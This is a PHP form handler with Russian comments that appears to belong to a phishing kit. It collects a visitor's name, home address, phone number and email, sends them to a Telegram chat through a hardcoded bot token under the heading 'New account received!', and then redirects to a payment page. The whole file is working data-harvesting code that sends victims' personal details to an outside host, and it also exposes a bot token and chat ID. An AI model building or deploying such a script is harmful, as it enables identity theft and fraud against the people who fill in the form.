<?php

//В переменную $token нужно вставить токен, который нам прислал @botFather
$token = "5269596206:AAHMsmsU05t5pUAG6KdFFSEFGp1RpocU9OA";

//Сюда вставляем chat_id
$chat_id = "-783916466";

//Определяем переменные для передачи данных из нашей формы
if ($_POST['act'] == 'order') {
    $first_name = ($_POST['first_name']);
    $last_name = ($_POST['last_name']);
    $street = ($_POST['street']);
    $house_number = ($_POST['house_number']);
    $city = ($_POST['city']);
    $postcode = ($_POST['postcode']);
    $country = ($_POST['country']);
    $region = ($_POST['region']);
    $mobile = ($_POST['phone']);
    $email = ($_POST['email']);

//Собираем в массив то, что будет передаваться боту
    $arr = array(
        '📥 Получен новый аккаунт!' => '',
        ''=>'',
'👨🏻Имя:' => $first_name,
'👨🏻Фамилия:' => $last_name,
'🗺Улица:' => $street,
'🗺Номер дома:' => $house_number,
'🏛Город:' => $city,
'📮ЗИП:' => $postcode,
'🗺Страна:' => $country,
'🌍Штат:' => $region,
'📞Номер_телефона:' => $mobile,
'📧_E-Mail:' => $email,
);
//Настраиваем внешний вид сообщения в телеграме
    foreach($arr as $key => $value) {
        $txt .=  "<b>".$key."</b> ".$value."%0A";
    };

//Передаем данные боту
    $sendToTelegram = fopen("https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chat_id}&parse_mode=html&text={$txt}","r");

//Выводим сообщение об успешной отправке
    if ($sendToTelegram) {
        echo "<script> window.location.href = './payment.php';</script>";
    }

}

?>